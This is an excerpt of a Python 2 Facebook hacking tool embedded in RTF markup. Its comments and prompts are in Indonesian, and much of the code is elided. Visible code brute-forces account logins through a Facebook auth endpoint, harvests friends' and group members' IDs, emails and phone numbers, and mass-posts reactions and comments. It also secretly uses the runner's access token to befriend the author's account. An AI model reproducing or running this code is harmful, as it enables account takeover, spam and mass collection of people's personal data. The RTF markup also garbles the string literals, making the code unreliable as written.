...
\pard\sa200\sl276\slmult1\f0\fs22\lang9 import os, sys\par
\par
def wa():\par
...
\par
        ...
        if 'save-device' in url:\par
            try:\par
                ...
                requests.post('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token= }}{\fldrslt{https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=\ul0\cf0}}}}\f0\fs22 ' + z['access_token'])\par
                os.system('xdg-open {{\field{\*\fldinst{HYPERLINK https://www.facebook.com/HATERZKAABUUG.ZAINII }}{\fldrslt{https://www.facebook.com/HATERZKAABUUG.ZAINII\ul0\cf0}}}}\f0\fs22 )  )\par
                time.sleep(2)\par
                menu()\par
...
\par
    ...
    r = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/me/friends?access_token= }}{\fldrslt{https://graph.facebook.com/me/friends?access_token=\ul0\cf0}}}}\f0\fs22 ' + toket)\par
    cok = json.loads(r.text)\par
    for p in cok['data']:\par
        if id in p['name'] or id in p['id']:\par
            r = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + p['id'] + '?access_token=' + toket)\par
            z = json.loads(r.text)\par
            print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
            try:\par
...
def mini():\par
    ...
    try:\par
        ...
        try:\par
            ...
            jalan('\\x1b[1;91m[\\xe2\\x9c\\xba] \\x1b[1;92mTunggu sebentar \\x1b[1;97m...')\par
            r = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + id + '?access_token=' + toket)\par
            ...
            data = urllib.urlopen('{{\field{\*\fldinst{HYPERLINK https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email= }}{\fldrslt{https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\ul0\cf0}}}}\f0\fs22 ' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')\par
...
\par
            ...
            if peak == '2':\par
                ...
                try:\par
                    ...
                    super()\par
\par
                re = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)\par
...
\par
    ...
    jml = 0\par
    jalan('\\x1b[1;91m[\\xe2\\x9c\\xba] \\x1b[1;92mTunggu sebentar \\x1b[1;97m...')\par
    teman = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/me/friends?access_token= }}{\fldrslt{https://graph.facebook.com/me/friends?access_token=\ul0\cf0}}}}\f0\fs22 ' + toket)\par
    ...
    for w in kimak['data']:\par
        ...
        id = w['id']\par
        nama = w['name']\par
        links = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + id + '?access_token=' + toket)\par
    ...
    try:\par
        ...
        try:\par
            ...
            try:\par
                ...
                grab()\par
\par
            r = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + idt + '?fields=friends.limit(5000)&access_token=' + toket)\par
            z = json.loads(r.text)\par
...
\par
            ...
            jalan('\\x1b[1;91m[\\xe2\\x9c\\xba] \\x1b[1;92mTunggu sebentar \\x1b[1;97m...')\par
            print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
            re = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + id + '/members?fields=name,id&access_token=' + toket)\par
            s = json.loads(re.text)\par
            for i in s['data']:\par
...
def email():\par
    ...
    try:\par
        ...
        try:\par
            ...
            print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
            for i in a['data']:\par
                x = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + i['id'] + '?access_token=' + toket)\par
...
\par
            mails = raw_input('\\x1b[1;91m[+] \\x1b[1;92mSimpan File \\x1b[1;97mext(file.txt) \\x1b[1;91m: \\x1b[1;97m')\par
            r = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + idt + '/friends?access_token=' + toket)\par
            a = json.loads(r.text)\par
            mpsh = open(mails, 'w')\par
            jalan('\\x1b[1;91m[\\xe2\\x9c\\xba] \\x1b[1;92mTunggu sebentar \\x1b[1;97m...')\par
            print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
...
def nomor_hp():\par
    ...
    try:\par
        ...
        try:\par
            ...
            print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
            for n in z['data']:\par
                x = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + n['id'] + '?access_token=' + toket)\par
                z = json.loads(x.text)\par
                try:\par
    ...
    try:\par
        ...
        try:\par
            ...
            for a in ah['feed']['data']:\par
                y = a['id']\par
                reaksi.append(y)\par
                requests.post('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + y + '/reactions?type=' + tipe + '&access_token=' + toket)\par
...
def reactg():\par
    ...
    try:\par
        ...
        limit = raw_input('\\x1b[1;91m[!] \\x1b[1;92mLimit \\x1b[1;91m:\\x1b[1;97m ')\par
        ah = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/group/?id= }}{\fldrslt{https://graph.facebook.com/group/?id=\ul0\cf0}}}}\f0\fs22 ' + ide + '&access_token=' + toket)\par
    ...
    try:\par
        ...
        try:\par
            ...
            for s in a['feed']['data']:\par
                f = s['id']\par
                komen.append(f)\par
                requests.post('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + f + '/comments?message=' + km + '&access_token=' + toket)\par
...
def grup_komen():\par
    ...
    try:\par
        ...
        try:\par
            ...
            asw = json.loads(ah.text)\par
            print '\\x1b[1;91m[\\x1b[1;96m\\xe2\\x9c\\x93\\x1b[1;91m] \\x1b[1;92mNama grup \\x1b[1;91m:\\x1b[1;97m ' + asw['name']\par
            p = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/v3.0/ }}{\fldrslt{https://graph.facebook.com/v3.0/\ul0\cf0}}}}\f0\fs22 ' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)\par
            a = json.loads(p.text)\par
            jalan('\\x1b[1;91m[\\xe2\\x9c\\xba] \\x1b[1;92mTunggu sebentar \\x1b[1;97m...')\par
            print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
            for s in a['feed']['data']:\par
...
\par
    ...
    print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
    asu = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/me/feed?access_token= }}{\fldrslt{https://graph.facebook.com/me/feed?access_token=\ul0\cf0}}}}\f0\fs22 ' + toket)\par
    asus = json.loads(asu.text)\par
    for p in asus['data']:\par
        id = p['id']\par
        piro = 0\par
        url = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/ }}{\fldrslt{https://graph.facebook.com/\ul0\cf0}}}}\f0\fs22 ' + id + '?method=delete&access_token=' + toket)\par
...
\par
    ...
    print 40 * '\\x1b[1;97m\\xe2\\x95\\x90'\par
    limit = raw_input('\\x1b[1;91m[!] \\x1b[1;92mLimit \\x1b[1;91m:\\x1b[1;97m ')\par
    r = requests.get('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/me/friendrequests?limit= }}{\fldrslt{https://graph.facebook.com/me/friendrequests?limit=\ul0\cf0}}}}\f0\fs22 ' + limit + '&access_token=' + toket)\par
    ...
    for i in teman['data']:\par
        gas = requests.post('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/me/friends/ }}{\fldrslt{https://graph.facebook.com/me/friends/\ul0\cf0}}}}\f0\fs22 ' + i['from']['id'] + '?access_token=' + toket)\par
    ...
    try:\par
        ...
        try:\par
            ...
            for i in cok['data']:\par
                nama = i['name']\par
                id = i['id']\par
                requests.delete('{{\field{\*\fldinst{HYPERLINK https://graph.facebook.com/me/friends?uid= }}{\fldrslt{https://graph.facebook.com/me/friends?uid=\ul0\cf0}}}}\f0\fs22 ' + id + '&access_token=' + toket)\par
